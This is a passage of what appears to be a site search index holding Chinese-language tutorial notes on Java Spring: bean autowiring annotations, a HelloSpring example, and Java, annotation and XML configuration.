\u4f7f\u7528\u65b9\u6cd5 \u4f9d\u7136\u5728xml\u4e2d\u7f16\u5199bean\uff0c\u4f46\u662f\u4e0d\u9700\u8981\u518d\u6ce8\u5165\u5c5e\u6027 <bean id= \"people\" class= \"top.longlone.People\" /> <bean id= \"dog\" class= \"top.longlone.Dog\" /> \u7136\u540e\u5728\u4ee3\u7801\u5c5e\u6027\u4e0a\u4f7f\u7528@Autowired\u6ce8\u89e3\uff0c\u5b9e\u73b0\u7684\u6548\u679c\u662f\u5148\u7c7b\u4f3c\u4e8ebyType\u81ea\u52a8\u88c5\u914d\uff0c\u82e5\u6709\u591a\u4e2a\u76f8\u540c\u7c7b\u578b\uff0c\u5219\u7c7b\u4f3c\u4e8ebyName\u81ea\u52a8\u88c5\u914d package top.longlone ; import org.springframework.beans.factory.annotation.Autowired ; public class People { @Autowired private Dog dog ; // \u7701\u7565getter setter toStirng\u65b9\u6cd5 @Autowired\u53ef\u4ee5\u8bbe\u7f6e\u5c5e\u6027required\uff0c\u9ed8\u8ba4\u4e3atrue\uff0c\u82e5\u8bbe\u7f6e\u4e3afalse\uff0c\u5219\u58f0\u660e\u8fd9\u4e2a\u4f9d\u8d56\u662f\u975e\u5fc5\u987b\u7684\uff0c\u53ef\u4ee5\u4e3a\u7a7a ```java package top.longlone; import org.springframework.beans.factory.annotation.Autowired; public class People { @Autowired(required = false) private Dog dog; } \u5982\u679c\u6709\u591a\u4e2a\u76f8\u540c\u7c7b\u578b\u7684bean\uff0c\u5219\u53ef\u4ee5\u4f7f\u7528@Qualifier\u6ce8\u89e3\u6765\u6307\u5b9a\u4f7f\u7528\u54ea\u4e2a\u540d\u5b57\u7684bean ```java package top.longlone; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.beans.factory.annotation.Qualifier; public class People { @Autowired @Qualifier(value = \"dog\") private Dog dog; } \u5728java<11\u4e2djva\u539f\u751f\u81ea\u5e26\u4e86\u4e00\u4e2a@Resource\u6ce8\u89e3\uff0c\u5b83\u7684\u4f5c\u7528\u548c@Autowired\u7c7b\u4f3c\uff0c\u5b9e\u73b0\u7684\u6548\u679c\u662f\u5148\u7c7b\u4f3c\u4e8ebyName\u81ea\u52a8\u88c5\u914d\uff0c\u82e5\u65e0\u6cd5\u627e\u5230\u5bf9\u5e94\u7684id\uff0c\u5219\u7c7b\u4f3cbyType\u81ea\u52a8\u88c5\u914d\uff0c\u540c\u65f6\u5b83\u53ef\u4ee5\u6267\u884cname\u5c5e\u6027\u6765\u6307\u5411\u5177\u4f53\u7684\u4e00\u4e2abean package top.longlone ; import javax.annotation.Resource ; public class People { @Resource ( name = \"dog22\" ) private Dog dog ; } java11\u53ca\u4e4b\u540e\u9700\u8981\u901a\u8fc7\u6dfb\u52a0\u4f9d\u8d56\u7684\u65b9\u5f0f\u624d\u80fd\u4f7f\u7528@Resource\u6ce8\u89e3 <dependency> <groupId> javax.annotation </groupId> <artifactId> javax.annotation-api </artifactId> <version> 1.3.1 </version> </dependency>","title":"\u6ce8\u89e3\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Bean%E7%9A%84%E8%A3%85%E9%85%8D/#\u603b\u7ed3","text":"Bean\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d\u6709\u4e24\u79cd\u65b9\u5f0f\uff0c\u5206\u522b\u662f\u901a\u8fc7xml\u548c\u901a\u8fc7\u6ce8\u89e3\u3002 Bean\u901a\u8fc7xml\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d\u6709\u4e09\u79cd\u65b9\u5f0f\uff0c\u5206\u522b\u662fbyName\uff0cbyType\u548cconstructor\u3002 Bean\u901a\u8fc7\u6ce8\u89e3\u5b9e\u73b0\u81ea\u52a8\u88c5\u914d\u6709\u4e09\u4e2a\u5e38\u89c1\u6ce8\u89e3\uff0c\u5206\u522b@Autowired\uff0c@Qualfilter\uff0c@Resource","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/HelloSpring/","text":"HelloSpring # \u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684\u7c7b\u53bb\u4f53\u73b0Spring\u7684\u601d\u60f3 package top.longlone ; public class HelloSpring { private String str ; public String getStr () { return str ; } public void setStr ( String str ) { this . str = str ; } @Override public String toString () { return \"HelloSpring{\" + \"str='\" + str + '\\'' + '}' ; } } <!-- beans.xml --> <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\" > <!-- \u901a\u8fc7Spring\u7ba1\u7406\u7684\u7c7b\u53ebBean \u4e00\u4e2aid\u5bf9\u5e94\u4e00\u4e2aBean Spring\u901a\u8fc7\u53cd\u5c04\u521b\u5efaBean\uff0c\u6211\u4eec\u901a\u8fc7id\u83b7\u53d6Bean property\u7528\u4e8e\u7ed9Bean\u7684\u5c5e\u6027\u8bbe\u7f6e\u503c\uff0cvalue\u6307\u5b9a\u4e00\u4e2a\u503c\uff0cref\u6307\u5411\u4e00\u4e2aBean --> <bean id= \"hello\" class= \"top.longlone.HelloSpring\" > <property name= \"str\" value= \"Spring\" /> </bean> </beans> import org.springframework.context.ApplicationContext ; import org.springframework.context.support.ClassPathXmlApplicationContext ; import top.longlone.HelloSpring ; public class MyTest { public static void main ( String [] args ) { ApplicationContext context = new ClassPathXmlApplicationContext ( \"beans.xml\" ); HelloSpring hello = ( HelloSpring ) context . getBean ( \"hello\" ); System . out . println ( hello . toString ()); } } ```` \u53ef\u4ee5\u770b\u5230Spring\u5e2e\u52a9\u6211\u4eec\u521b\u5efa \uff0c \u7ba1\u7406 \uff0c \u5206\u914d\u5bf9\u8c61 \uff0c \u6211\u4eec\u4e0d\u518d\u9700\u8981\u81ea\u5df1\u53bbnew\u4e00\u4e2a\u5bf9\u8c61\u4e86 \uff0c Spring\u4e2d\u7684\u5bf9\u8c61\u9ed8\u8ba4\u662f\u5355\u4f8b\u6a21\u5f0f \uff0c \u5728\u914d\u7f6e\u6587\u4ef6\u52a0\u8f7d\u65f6\u5bf9\u8c61\u5df2\u7ecf\u6ce8\u518c\u4e86 \u3002 ## \u4f7f\u7528\u6784\u9020\u51fd\u6570 \u524d\u9762xml\u4e2d\u8bbe\u7f6e\u5c5e\u6027\u5176\u5b9e\u662f\u901a\u8fc7\u8c03\u7528setter\u65b9\u6cd5\u53bb\u8bbe\u7f6e\u7684 \uff0c \u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6784\u9020\u51fd\u6570\u53bb\u8bbe\u7f6e\u5c5e\u6027 \uff0c \u4f8b\u5982 \uff1a ``` java public class HelloSpring { public HelloSpring () { } public HelloSpring ( String str ) { this . str = str ; } // ... } - \u5bf9\u5e94\u7684xml\u5982\u4e0b\uff1a ... <bean id= \"hello\" class= \"top.longlone.HelloSpring\" > <constructor-arg index= \"0\" value= \"whoami\" ></constructor-arg> <!-- \u4e0b\u6807\u65b9\u5f0f --> <constructor-arg name= \"str\" value= \"whoami\" ></constructor-arg> <!-- \u53d8\u91cf\u540d\u65b9\u5f0f --> </bean> ... \u603b\u7ed3 # \u7b80\u5355\u4e86\u89e3\u4e86\u5982\u4f55\u4f7f\u7528Spring\u7684XML\u914d\u7f6e\u6587\u4ef6\u521b\u5efa\uff0c\u7ba1\u7406\uff0c\u5206\u914d\u5bf9\u8c61\u3002 \u5728Spring\u4e2dBean\u662f\u5176\u7ba1\u7406\u7684\u5bf9\u8c61\uff0c\u662f\u7a0b\u5e8f\u6784\u5efa\u7684\u57fa\u672c\u5757\u3002Bean\u5176\u5b9e\u662f\u7b26\u5408\u4e00\u5b9a\u89c4\u8303\u7f16\u5199\u7684Java\u7c7b\uff0c\u8fd9\u4e9b\u89c4\u8303\u5206\u522b\u662f 1. \u6240\u6709\u5c5e\u6027\u4e3aprivate 2. \u63d0\u4f9b\u9ed8\u8ba4\u6784\u9020\u65b9\u6cd5 3. \u63d0\u4f9bgetter\u548csetter 4. \u5b9e\u73b0serializable\u63a5\u53e3","title":"HelloSpring"},{"location":"%E5%AE%89%E5%85%A8/java/spring/HelloSpring/#hellospring","text":"\u7f16\u5199\u4e00\u4e2a\u7b80\u5355\u7684\u7c7b\u53bb\u4f53\u73b0Spring\u7684\u601d\u60f3 package top.longlone ; public class HelloSpring { private String str ; public String getStr () { return str ; } public void setStr ( String str ) { this . str = str ; } @Override public String toString () { return \"HelloSpring{\" + \"str='\" + str + '\\'' + '}' ; } } <!-- beans.xml --> <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\" > <!-- \u901a\u8fc7Spring\u7ba1\u7406\u7684\u7c7b\u53ebBean \u4e00\u4e2aid\u5bf9\u5e94\u4e00\u4e2aBean Spring\u901a\u8fc7\u53cd\u5c04\u521b\u5efaBean\uff0c\u6211\u4eec\u901a\u8fc7id\u83b7\u53d6Bean property\u7528\u4e8e\u7ed9Bean\u7684\u5c5e\u6027\u8bbe\u7f6e\u503c\uff0cvalue\u6307\u5b9a\u4e00\u4e2a\u503c\uff0cref\u6307\u5411\u4e00\u4e2aBean --> <bean id= \"hello\" class= \"top.longlone.HelloSpring\" > <property name= \"str\" value= \"Spring\" /> </bean> </beans> import org.springframework.context.ApplicationContext ; import org.springframework.context.support.ClassPathXmlApplicationContext ; import top.longlone.HelloSpring ; public class MyTest { public static void main ( String [] args ) { ApplicationContext context = new ClassPathXmlApplicationContext ( \"beans.xml\" ); HelloSpring hello = ( HelloSpring ) context . getBean ( \"hello\" ); System . out . println ( hello . toString ()); } } ```` \u53ef\u4ee5\u770b\u5230Spring\u5e2e\u52a9\u6211\u4eec\u521b\u5efa \uff0c \u7ba1\u7406 \uff0c \u5206\u914d\u5bf9\u8c61 \uff0c \u6211\u4eec\u4e0d\u518d\u9700\u8981\u81ea\u5df1\u53bbnew\u4e00\u4e2a\u5bf9\u8c61\u4e86 \uff0c Spring\u4e2d\u7684\u5bf9\u8c61\u9ed8\u8ba4\u662f\u5355\u4f8b\u6a21\u5f0f \uff0c \u5728\u914d\u7f6e\u6587\u4ef6\u52a0\u8f7d\u65f6\u5bf9\u8c61\u5df2\u7ecf\u6ce8\u518c\u4e86 \u3002 ## \u4f7f\u7528\u6784\u9020\u51fd\u6570 \u524d\u9762xml\u4e2d\u8bbe\u7f6e\u5c5e\u6027\u5176\u5b9e\u662f\u901a\u8fc7\u8c03\u7528setter\u65b9\u6cd5\u53bb\u8bbe\u7f6e\u7684 \uff0c \u6211\u4eec\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6784\u9020\u51fd\u6570\u53bb\u8bbe\u7f6e\u5c5e\u6027 \uff0c \u4f8b\u5982 \uff1a ``` java public class HelloSpring { public HelloSpring () { } public HelloSpring ( String str ) { this . str = str ; } // ... } - \u5bf9\u5e94\u7684xml\u5982\u4e0b\uff1a ... <bean id= \"hello\" class= \"top.longlone.HelloSpring\" > <constructor-arg index= \"0\" value= \"whoami\" ></constructor-arg> <!-- \u4e0b\u6807\u65b9\u5f0f --> <constructor-arg name= \"str\" value= \"whoami\" ></constructor-arg> <!-- \u53d8\u91cf\u540d\u65b9\u5f0f --> </bean> ...","title":"HelloSpring"},{"location":"%E5%AE%89%E5%85%A8/java/spring/HelloSpring/#\u603b\u7ed3","text":"\u7b80\u5355\u4e86\u89e3\u4e86\u5982\u4f55\u4f7f\u7528Spring\u7684XML\u914d\u7f6e\u6587\u4ef6\u521b\u5efa\uff0c\u7ba1\u7406\uff0c\u5206\u914d\u5bf9\u8c61\u3002 \u5728Spring\u4e2dBean\u662f\u5176\u7ba1\u7406\u7684\u5bf9\u8c61\uff0c\u662f\u7a0b\u5e8f\u6784\u5efa\u7684\u57fa\u672c\u5757\u3002Bean\u5176\u5b9e\u662f\u7b26\u5408\u4e00\u5b9a\u89c4\u8303\u7f16\u5199\u7684Java\u7c7b\uff0c\u8fd9\u4e9b\u89c4\u8303\u5206\u522b\u662f 1. \u6240\u6709\u5c5e\u6027\u4e3aprivate 2. \u63d0\u4f9b\u9ed8\u8ba4\u6784\u9020\u65b9\u6cd5 3. \u63d0\u4f9bgetter\u548csetter 4. \u5b9e\u73b0serializable\u63a5\u53e3","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/","text":"Spring\u4e2d\u4f7f\u7528java\u4ee3\u7801\u914d\u7f6e # \u5728Spring\u4e2d\u4e5f\u53ef\u4ee5\u4f7f\u7528java\u4ee3\u7801\u8fdb\u884cspring\u7684\u914d\u7f6e\uff0c\u8fd9\u79cd\u65b9\u5f0f\u76f8\u6bd4xml\u66f4\u52a0\u7684\u7075\u6d3b package top.longlone ; import org.springframework.context.annotation.Bean ; import org.springframework.context.annotation.Configuration ; import org.springframework.context.annotation.Scope ; @Configuration public class AppConfig { @Bean @Scope ( \"singleton\" ) public User user () { return new User (); } } \u8fd9\u76f8\u5f53\u4e8exml\u914d\u7f6e\u4e2d\u7684 <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:context= \"http://www.springframework.org/schema/context\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\" > <bean id= \"user\" class= \"top.longlone.User\" /> </beans> \u8fd9\u91cc\u4e5f\u6709\u4e00\u4e9b\u76f8\u5173\u5e38\u7528\u7684\u6ce8\u89e3 \u76f8\u5173\u6ce8\u89e3 # @Configuration # \u8fd9\u662f\u4e00\u4e2a\u914d\u7f6e\u7c7b\u7684\u6ce8\u89e3\uff0c\u7528\u4e8e\u914d\u7f6e\u5176\u4ed6bean @Import # \u76f8\u5f53\u4e8exml\u4e2d\u7684 <import> \u6807\u7b7e\uff0c\u7528\u4e8e\u5305\u542b\u5176\u4ed6\u914d\u7f6e\u7c7b CompoentScan # \u76f8\u5f53\u4e8e <context:component-scan base-package=\"\"/> \u603b\u7ed3 # \u8fd9\u79cd\u914d\u7f6e\u7c7b\u7ecf\u5e38\u89c1\u4e8eSpringBoot\u4e2d\u3002\u662fspring4\u4e4b\u540e\u63a8\u8350\u4f7f\u7528\u7684\u914d\u7f6e\u65b9\u5f0f\u3002\u5b83\u548cxml\u914d\u7f6e\u6587\u4ef6\u4efb\u9009\u5176\u4e00\u4f5c\u4e3aspring\u7684\u914d\u7f6e\u65b9\u5f0f\u5373\u53ef\u3002","title":"Spring\u4e2d\u4f7f\u7528java\u4ee3\u7801\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#spring\u4e2d\u4f7f\u7528java\u4ee3\u7801\u914d\u7f6e","text":"\u5728Spring\u4e2d\u4e5f\u53ef\u4ee5\u4f7f\u7528java\u4ee3\u7801\u8fdb\u884cspring\u7684\u914d\u7f6e\uff0c\u8fd9\u79cd\u65b9\u5f0f\u76f8\u6bd4xml\u66f4\u52a0\u7684\u7075\u6d3b package top.longlone ; import org.springframework.context.annotation.Bean ; import org.springframework.context.annotation.Configuration ; import org.springframework.context.annotation.Scope ; @Configuration public class AppConfig { @Bean @Scope ( \"singleton\" ) public User user () { return new User (); } } \u8fd9\u76f8\u5f53\u4e8exml\u914d\u7f6e\u4e2d\u7684 <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:context= \"http://www.springframework.org/schema/context\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context.xsd\" > <bean id= \"user\" class= \"top.longlone.User\" /> </beans> \u8fd9\u91cc\u4e5f\u6709\u4e00\u4e9b\u76f8\u5173\u5e38\u7528\u7684\u6ce8\u89e3","title":"Spring\u4e2d\u4f7f\u7528java\u4ee3\u7801\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#\u76f8\u5173\u6ce8\u89e3","text":"","title":"\u76f8\u5173\u6ce8\u89e3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#configuration","text":"\u8fd9\u662f\u4e00\u4e2a\u914d\u7f6e\u7c7b\u7684\u6ce8\u89e3\uff0c\u7528\u4e8e\u914d\u7f6e\u5176\u4ed6bean","title":"@Configuration"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#import","text":"\u76f8\u5f53\u4e8exml\u4e2d\u7684 <import> \u6807\u7b7e\uff0c\u7528\u4e8e\u5305\u542b\u5176\u4ed6\u914d\u7f6e\u7c7b","title":"@Import"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#compoentscan","text":"\u76f8\u5f53\u4e8e <context:component-scan base-package=\"\"/>","title":"CompoentScan"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8java%E4%BB%A3%E7%A0%81%E9%85%8D%E7%BD%AE/#\u603b\u7ed3","text":"\u8fd9\u79cd\u914d\u7f6e\u7c7b\u7ecf\u5e38\u89c1\u4e8eSpringBoot\u4e2d\u3002\u662fspring4\u4e4b\u540e\u63a8\u8350\u4f7f\u7528\u7684\u914d\u7f6e\u65b9\u5f0f\u3002\u5b83\u548cxml\u914d\u7f6e\u6587\u4ef6\u4efb\u9009\u5176\u4e00\u4f5c\u4e3aspring\u7684\u914d\u7f6e\u65b9\u5f0f\u5373\u53ef\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/","text":"Spring\u4e2d\u4f7f\u7528\u6ce8\u89e3\u914d\u7f6e # \u524d\u63d0 # <?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:context= \"http://www.springframework.org/schema/context\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/beans/spring-context.xsd\" > <context:annotation-config/> <context:component-scan base-package= \"top.longlone\" /> </beans> spring\u4e2d\u5e38\u7528\u7684\u6ce8\u89e3 # @Resource # \u53c2\u8003 Bean\u7684\u88c5\u914d @Component # \u7528\u4e8e\u6ce8\u89e3\u7c7b\uff0c\u76f8\u5f53\u4e8e\u76f4\u63a5\u5f80spring\u4e2d\u6ce8\u518c\u8fd9\u4e2a\u7c7b\u4e3aBean\uff0c\u8981\u4f7f\u7528\u8fd9\u4e2a\u6ce8\u89e3\u5fc5\u987b\u5728xml\u4e2d\u914d\u7f6e context:compoent-scan Repository # \u540cComponent\uff0c\u7528\u4e8eDAO\u5c42 Service # \u540cComponent\uff0c\u7528\u4e8eService\u5c42 Controller # \u540cComponent\uff0c\u7528\u4e8eController\u5c42 Scope # \u540cxml\u4e2dbean\u4e0b\u7684scope\u5c5e\u6027\uff0c\u7528\u4e8e\u8bbe\u7f6ebean\u7684\u4f5c\u7528\u57df(\u5355\u4f8b\u6a21\u5f0f\uff0c\u539f\u578b\u6a21\u5f0f\u7b49)\uff0c\u4f8b\u5982 @Scope(\"singleton\") @Value # \u6ce8\u89e3\u5c5e\u6027\u6216\u8005set\u65b9\u6cd5\uff0c\u7528\u4e8e\u81ea\u52a8\u8bbe\u7f6e\u5b9e\u4f8b\u5c5e\u6027\u503c\uff0c\u76f8\u5f53\u4e8e <property name=\"...\" value=\"...\"/> \uff0c\u4f8b\u5982 @Value(\"whoami\") @Autowired # \u7528\u4e8e\u81ea\u52a8\u88c5\u914d\u5c5e\u6027\uff0c\u76f8\u5f53\u4e8e <property name=\"...\" ref=\"...\"/> \u53c2\u8003 Bean\u7684\u88c5\u914d @Qualfilter # \u53c2\u8003 Bean\u7684\u88c5\u914d \u603b\u7ed3 # xml\u9002\u7528\u6027\u66f4\u9ad8\uff0c\u6ce8\u89e3\u66f4\u7b80\u6d01\uff0c\u4f46\u662f\u590d\u6742\u7684\u914d\u7f6e\u8fd8\u662f\u5e94\u8be5\u4f7f\u7528xml\u8fdb\u884c\u914d\u7f6e\u3002\u5728\u5b9e\u9645\u5f00\u53d1\u4e2d\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528xml\u8fdb\u884cbean\u7684\u7ba1\u7406\uff0c\u7136\u540e\u4f7f\u7528\u6ce8\u89e3\u5b8c\u6210\u5c5e\u6027\u6ce8\u5165\u3002","title":"Spring\u4e2d\u4f7f\u7528\u6ce8\u89e3\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#spring\u4e2d\u4f7f\u7528\u6ce8\u89e3\u914d\u7f6e","text":"","title":"Spring\u4e2d\u4f7f\u7528\u6ce8\u89e3\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#\u524d\u63d0","text":"<?xml version=\"1.0\" encoding=\"UTF-8\"?> <beans xmlns= \"http://www.springframework.org/schema/beans\" xmlns:context= \"http://www.springframework.org/schema/context\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/beans/spring-context.xsd\" > <context:annotation-config/> <context:component-scan base-package= \"top.longlone\" /> </beans>","title":"\u524d\u63d0"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#spring\u4e2d\u5e38\u7528\u7684\u6ce8\u89e3","text":"","title":"spring\u4e2d\u5e38\u7528\u7684\u6ce8\u89e3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#resource","text":"\u53c2\u8003 Bean\u7684\u88c5\u914d","title":"@Resource"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#component","text":"\u7528\u4e8e\u6ce8\u89e3\u7c7b\uff0c\u76f8\u5f53\u4e8e\u76f4\u63a5\u5f80spring\u4e2d\u6ce8\u518c\u8fd9\u4e2a\u7c7b\u4e3aBean\uff0c\u8981\u4f7f\u7528\u8fd9\u4e2a\u6ce8\u89e3\u5fc5\u987b\u5728xml\u4e2d\u914d\u7f6e context:compoent-scan","title":"@Component"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#repository","text":"\u540cComponent\uff0c\u7528\u4e8eDAO\u5c42","title":"Repository"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#service","text":"\u540cComponent\uff0c\u7528\u4e8eService\u5c42","title":"Service"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#controller","text":"\u540cComponent\uff0c\u7528\u4e8eController\u5c42","title":"Controller"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#scope","text":"\u540cxml\u4e2dbean\u4e0b\u7684scope\u5c5e\u6027\uff0c\u7528\u4e8e\u8bbe\u7f6ebean\u7684\u4f5c\u7528\u57df(\u5355\u4f8b\u6a21\u5f0f\uff0c\u539f\u578b\u6a21\u5f0f\u7b49)\uff0c\u4f8b\u5982 @Scope(\"singleton\")","title":"Scope"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#value","text":"\u6ce8\u89e3\u5c5e\u6027\u6216\u8005set\u65b9\u6cd5\uff0c\u7528\u4e8e\u81ea\u52a8\u8bbe\u7f6e\u5b9e\u4f8b\u5c5e\u6027\u503c\uff0c\u76f8\u5f53\u4e8e <property name=\"...\" value=\"...\"/> \uff0c\u4f8b\u5982 @Value(\"whoami\")","title":"@Value"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#autowired","text":"\u7528\u4e8e\u81ea\u52a8\u88c5\u914d\u5c5e\u6027\uff0c\u76f8\u5f53\u4e8e <property name=\"...\" ref=\"...\"/> \u53c2\u8003 Bean\u7684\u88c5\u914d","title":"@Autowired"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#qualfilter","text":"\u53c2\u8003 Bean\u7684\u88c5\u914d","title":"@Qualfilter"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%B8%AD%E4%BD%BF%E7%94%A8%E6%B3%A8%E8%A7%A3%E9%85%8D%E7%BD%AE/#\u603b\u7ed3","text":"xml\u9002\u7528\u6027\u66f4\u9ad8\uff0c\u6ce8\u89e3\u66f4\u7b80\u6d01\uff0c\u4f46\u662f\u590d\u6742\u7684\u914d\u7f6e\u8fd8\u662f\u5e94\u8be5\u4f7f\u7528xml\u8fdb\u884c\u914d\u7f6e\u3002\u5728\u5b9e\u9645\u5f00\u53d1\u4e2d\uff0c\u53ef\u4ee5\u8003\u8651\u4f7f\u7528xml\u8fdb\u884cbean\u7684\u7ba1\u7406\uff0c\u7136\u540e\u4f7f\u7528\u6ce8\u89e3\u5b8c\u6210\u5c5e\u6027\u6ce8\u5165\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%BD%BF%E7%94%A8XML%E9%85%8D%E7%BD%AE/","text":"Spring\u4f7f\u7528XML\u914d\u7f6e # alias # \u7528\u4e8e\u7ed9\u5b58\u5728\u7684bean\u8d77\u522b\u540d\uff0c\u4f8b\u5982\u7ed9user\u8d77\u522b\u540d\u4e3auserNew <alias name= \"user\" alias= \"userNew\" /> bean # id: bean\u7684\u552f\u4e00\u6807\u8bc6\u7b26 class: bean\u5bf9\u8c61\u5bf9\u5e94\u7684\u5b8c\u6574\u7c7b\u540d\uff08\u5305\u540d+\u7c7b\u540d\uff09 name: \u522b\u540d\uff0c\u53ef\u4ee5\u4f7f\u7528\u7a7a\u683c\u6216\u9017\u53f7\u53d6\u591a\u4e2a\u522b\u540d <bean id= \"hello\" class= \"top.longlone.HelloSpring\" name= \"h1,h2\" > <property name= \"str\" value= \"Spring\" /> </bean> import # \u4e00\u822c\u7528\u4e8e\u56e2\u961f\u5f00\u53d1\u4f7f\u7528\uff0c\u53ef\u4ee5\u5bfc\u5165\u5176\u4ed6\u914d\u7f6e\u6587\u4ef6 <import resource= \"beans.xml\" /> \u603b\u7ed3 # \u4e86\u89e3\u4e86Spring XML\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u914d\u7f6e\u9009\u9879\uff0c\u5206\u522b\u662falias\uff0cbean\uff0cimport\u3002","title":"Spring\u4f7f\u7528XML\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%BD%BF%E7%94%A8XML%E9%85%8D%E7%BD%AE/#spring\u4f7f\u7528xml\u914d\u7f6e","text":"","title":"Spring\u4f7f\u7528XML\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/spring/Spring%E4%BD%BF%E7%94%A8XML%E9%85%8D%E7%BD%AE/#alias","text":"\u7528\u4e8e\u7ed9\u5b58\u5728\u7684bean\u8d77\u522b\u540d\uff0c\u4f8b\u5982\u7ed9user\u8d77\u522b\u540d\u4e3auserNew <alias name= \"user\" alias= \"userNew\" 